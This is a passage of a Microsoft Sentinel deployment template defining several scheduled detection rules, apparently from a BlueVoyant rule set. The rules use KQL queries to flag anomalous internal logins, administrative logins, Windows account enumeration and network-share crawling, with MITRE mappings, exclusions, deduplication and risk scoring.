            "alertDescriptionFormat": "Generates an alert when a user is removed from an admin group\n\n{{ExtendedDescription}}\n\nMITRE: T1098 MITRE: T1484\nCategory: Windows Security\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "RBAScore": "bv_alarm_rba_score",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "bv_behavior_id": "bv_behavior_id"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object2"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object3"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-20540')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-20540')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-20540: [RBA] Auth - Anomalous Number Successful Internal Logins",
          "description": "Internal login events within a security product.\n\ncim_models: auth, network MITRE: T1078,T1110 Category: Azure Application Gateway,AzureFirewall,AzureMonitor(IIS),BVIM,Cisco ASA,Cisco ISE,Cisco Router Syslog Cribl,Entra ID,IBM iSeries,Linux,Linux Firewall,Microsoft Default Alert Table,Microsoft Defender XDR,Microsoft DHCP,Mimecast by BlueVoyant,MongoDB Audit,MSSQL,OktaSSO,Palo Alto GlobalProtect,Palo Alto Networks,Ping Federation,ProofpointTRAP,RSA SecureID,Security Onion,Sophos Firewall,VMware ESXi,VMware vCenter,Windows DHCP tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let alert_id = 'BV-20540';\nlet start_time = 1h;\nlet start_time_suppress = 1d;\nlet start_time_historical = 3d;\nlet end_time = now();\nlet alert_bin = 1h; \nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n    , 'RBASCORE': 0.1\n    , 'excluded_dedup_hash_fields': dynamic(['bv_start_time1', 'bv_authentication_protocol', 'bv_dest', 'bv_src_dvc_hostname'])\n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV20540_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic([]);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_raw','bv_start_time','bv_end_time','bv_event_count','bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV20540_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet calc_dedup_hash = (table_parameter: (*), excluded_fields:dynamic=dynamic([])){  \n    table_parameter  \n    //| extend excluded_fields = array_concat(bv_excluded_dedup_hash_fields,excluded_fields)   \n    | extend all_data = pack_all(ignore_null = true)  \n    | extend keys = array_sort_asc(bag_keys(all_data))  \n    | mv-apply k = keys to typeof(string) on (    \n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))  \n        | extend \n            is_valid_field = k startswith 'bv_' and not(k has_any (excluded_fields))\n            , is_valid_value = (gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1 and isnotempty(array_sort_desc(dynamic_entity)[0])) or (gettype(dynamic_entity) != 'array' and dynamic_entity != 'array')\n        | extend \n            bv_dedup_fields = iff(is_valid_field and is_valid_value, k, '')  \n            , bv_dedup_values = iff(is_valid_field and is_valid_value, coalesce(tostring(dynamic_entity[0]),dynamic_entity), '') \n        | summarize bv_dedup_fields = make_set_if(tostring(bv_dedup_fields), isnotempty(bv_dedup_fields)), dedup_values = make_set_if(tostring(bv_dedup_values), isnotempty(bv_dedup_values)) \n    )  \n    | extend bv_dedup_hash = hash_sha1(strcat_array(dedup_values,''))  \n}; \nlet results = materialize(bvim(starttime=ago(start_time_historical), endtime=end_time, bv_tags_has='auth,network')\n| project bv_start_time, bv_authentication_action, bv_authentication_result, bv_cim_category, bv_src_internal, bv_src_ip, bv_dest_user, bv_src_dvc_hostname, bv_dest_dvc_hostname, bv_dest_ip, bv_user, bv_authentication_protocol, bv_parser, sourcetype, bv_connector\n  | where \n          bv_authentication_action == 'login' \n          and bv_authentication_result == 'success'\n          and  bv_cim_category !in ('vpn')\n          and not(bv_dest_user endswith '$')\n          and (bv_src_internal == true or ipv4_is_private(bv_src_ip))\n          | extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_user))\n          | where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n          | project-away bv_tuning_target \n);\nlet bv_alarm_threshold = toscalar(results\n  | where bv_start_time <= ago(start_time)\n  | summarize bv_event_count = count() by bv_src_ip, bin(bv_start_time,alert_bin)\n  | summarize percentiles(bv_event_count,25,50,75,100)\n  |  extend MyDev = (percentile_bv_event_count_75 - percentile_bv_event_count_25)*1.0\n  // | where MyDev > 0\n  | extend MyVar = MyDev / percentile_bv_event_count_100 \n  | extend MyVarDev = MyDev * MyVar \n  | project bv_alarm_threshold = percentile_bv_event_count_75 + MyVarDev);\nresults\n| where bv_start_time > ago(start_time)\n| summarize\n        bv_start_time = min(bv_start_time)\n        , bv_end_time = max(bv_start_time)\n        , bv_event_count = count()\n        , bv_src_dvc_hostname = make_set_if(bv_src_dvc_hostname,isnotempty(bv_src_dvc_hostname),5)\n        , bv_dest_dvc_hostname = make_set_if(bv_dest_dvc_hostname,isnotempty(bv_dest_dvc_hostname),5)\n        , bv_dest_ip = make_set_if(bv_dest_ip, isnotempty(bv_dest_ip),5)\n        , bv_dest_ip_count = dcount(bv_dest_ip)\n        , bv_user = make_set_if(bv_user,isnotempty(bv_user),5)\n        , bv_user_count = dcount(bv_user)\n        , bv_authentication_protocol = make_set(bv_authentication_protocol)\n    by \n        bv_src_ip\n        , bv_parser\n        , sourcetype\n        , bv_connector\n        , bin(bv_start_time,alert_bin)\n|where bv_event_count > bv_alarm_threshold\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n| invoke calc_dedup_hash(excluded_dedup_fields)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash\n| extend \n    bv_alarm_victim_entities = dynamic([])\n    , bv_alarm_attacker_entities = array_concat(pack_array(bv_src_ip), bv_user, bv_src_dvc_hostname) \n    , bv_mapping_tag = bv_src_ip\n    , bv_user1 = tostring(bv_user[0])\n| extend bv_rule_version = '1.4.4500'\n| extend bv_rule_timestamp = '1701110622.9536395'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.4.4500 bv_rule_timestamp: 1701110622.9536395'\n| project-keep\n    bv_*\n    , ExtendedDescription\n    , sourcetype        ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P3D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1078",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-20540: [RBA] Auth - Anomalous Number Successful Internal Logins - {{bv_src_ip}}",
            "alertDescriptionFormat": "Internal login events within a security product.\n\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: auth, network\nMITRE: T1078 MITRE: T1110\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bv_dedup_hash": "bv_dedup_hash"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-20535')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-20535')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-20535: [RBA] Auth - Administrative Logins",
          "description": "Administrative users' login events within a security product.\n\ncim_models: auth, network MITRE: T1078,T1110 Category: Azure Application Gateway,AzureFirewall,AzureMonitor(IIS),BVIM,Cisco ASA,Cisco ISE,Cisco Router Syslog Cribl,Entra ID,IBM iSeries,Linux,Linux Firewall,Microsoft Default Alert Table,Microsoft Defender XDR,Microsoft DHCP,Mimecast by BlueVoyant,MongoDB Audit,MSSQL,OktaSSO,Palo Alto GlobalProtect,Palo Alto Networks,Ping Federation,ProofpointTRAP,RSA SecureID,Security Onion,Sophos Firewall,VMware ESXi,VMware vCenter,Windows DHCP tag: RBA",
          "severity": "Low",
          "enabled": false,
          "query": "let alert_id = 'BV-20535';\nlet start_time = 10m;\nlet start_time_suppress = 1d;\nlet end_time = now();\nlet alert_bin = 10m;\nlet global_config = dynamic({\n  'RBASCORE': real(.00001)\n});\nlet excluded_description_fields = dynamic([]);\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \nlet exclusions = array_concat(global_config['EXCLUSION'], BV20535_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};                 \nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV20535_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nbvim(starttime=ago(start_time), endtime=end_time, bv_tags_has='auth,network')\n| where sourcetype !~ 'AADNonInteractiveUserSignInLogs'\n| where bv_authentication_action == 'login'\n| where bv_authentication_result has_any ('success', 'failure')\n| where ipv6_is_match(bv_src_ip, '127.0.0.1') == false\n| where isnotempty(bv_user) and bv_user has_any (BV20535_CONFIG['ADMIN_ACCOUNT'])\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_user))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| extend bv_dedup_hash = hash_sha1(strcat(bv_user,bv_src_ip))\n| extend bv_behavior_id = hash_sha1(strcat(bv_user, bv_src_dvc))      \n| where bv_dedup_hash !in (BV_FUN_DEDUP(alert_id, start_time_suppress))\n| summarize\n        bv_event_count = count()\n        , bv_start_time = min(bv_start_time)\n        , bv_end_time = max(bv_end_time)\n        , bv_src_ip = make_set_if(replace_string(bv_src_ip, '::ffff:', ''), bv_src_ip != '-')\n        , bv_dedup_hash = make_set(bv_dedup_hash)\n        , bv_authentication_result = make_set(bv_authentication_result)\n        , bv_dest_dvc = make_set(bv_dest_dvc)\n        , bv_src_dvc = make_set(bv_src_dvc)\n        , bv_behavior_id = make_set(bv_behavior_id)              \n    by \n        bv_user\n        , sourcetype\n        , bv_connector\n| invoke description(excluded_description_fields)\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke rba_score_calculator(alert_id)\n| extend bv_alarm_victim_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_alarm_attacker_entities = bv_src_ip\n| extend bv_src_ip1 = bv_src_ip[0]\n| extend bv_src_ip2 = bv_src_ip[1]\n| extend bv_rule_version = '1.4.4500'\n| extend bv_rule_timestamp = '1701110622.927357'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.4.4500 bv_rule_timestamp: 1701110622.927357'      \n| project-keep\n    bv_*\n    , ExtendedDescription\n    , sourcetype",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1078",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-20535: [RBA] Auth - {{bv_connector}} - Administrative Logins - {{bv_user}}",
            "alertDescriptionFormat": "Administrative users' login events within a security product.\n\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: auth, network\nMITRE: T1078 MITRE: T1110\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bv_behavior_id": "bv_behavior_id",
            "bv_dedup_hash": "bv_dedup_hash"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1500')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1500')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1500: [RBA] Windows - Account Enumeration",
          "description": "Generates an event when a process enumerates the local groups to which a the specified user belongs on that computer. MITRE: T1087 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic([4798]);     \nlet start_time = 1h;\nlet end_time = now();\nlet latency = 1h;\nlet alert_bin = 1h;\nlet alert_type = 'RBA';\nlet alert_id = 'BV-1500:';\nlet start_time_suppress = 1d;\nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}])\n, 'excluded_dedup_hash_fields': dynamic(['bv_authentication_reason','bv_authentication_result','bv_event_id', 'bv_transaction_id','bv_vendor_mfa'])\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1500_CONFIG['RBASCORE']),1.0);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1500_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_cim_category','bv_user','bv_transaction_id', 'bv_start_time','bv_end_time', 'bv_event_count']));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);       \nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nSecurityEvent\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where SubjectUserName !endswith '$'\n| where SubjectUserName matches regex A1500_EXCLUDED_ACCOUNTS == false\n| extend bv_tuning_target = tolower(bv_cim_normalize_username(SubjectUserName))\n| where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2)\n| project-away bv_tuning_target \n| summarize EventCount = count(), TargetUserName = make_set(TargetUserName, 10), TargetAccountCount = dcount(TargetAccount), CompList = make_set(Computer, 10), bv_start_time = min(TimeGenerated) by SubjectUserName, CallerProcessName, bin_at(TimeGenerated,alert_bin, now())\n| extend ExtendedDescription = strcat(\n            'bv_start_time: ', bv_start_time\n            ,'\\nbv_src_user: ', SubjectUserName\n            ,'\\nbv_dest_user: ', TargetUserName\n            ,'\\nbv_dest_user_cnt: ', TargetAccountCount\n            ,'\\nbv_process: ', CallerProcessName)\n| extend bv_alarm_victim_entities = array_concat(TargetUserName, CompList), bv_alarm_attacker_entities = pack_array(SubjectUserName)\n        , bv_dedup_hash = hash_sha1(tolower(SubjectUserName))\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n| extend bv_alarm_rba_score =  BV_FUN_CALC_RBA(alert_id,visibility,rba_score)              \n| project \n    bv_start_time\n    , bv_src_user = SubjectUserName\n    , bv_dest_user = TargetUserName\n    , bv_dest_user_cnt = TargetAccountCount\n    , bv_process = CallerProcessName\n    , bv_dest_dvc = CompList\n    , TimeGenerated\n    , EventCount\n    , ExtendedDescription\n    , bv_alarm_attacker_entities\n    , bv_alarm_victim_entities\n    , bv_dedup_hash\n    , bv_alarm_rba_score",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1087"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an event when a process enumerates the local groups to which a the specified user belongs on that computer.\n\n{{ExtendedDescription}}\n\nMITRE: T1087\nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1508')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1508')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1508: [RBA] Windows - High Number Of Shares Crawling",
          "description": "This alerts when a user enumerates a high number of network shares. Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. MITRE: T1039,T1021,T1569,T1135 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
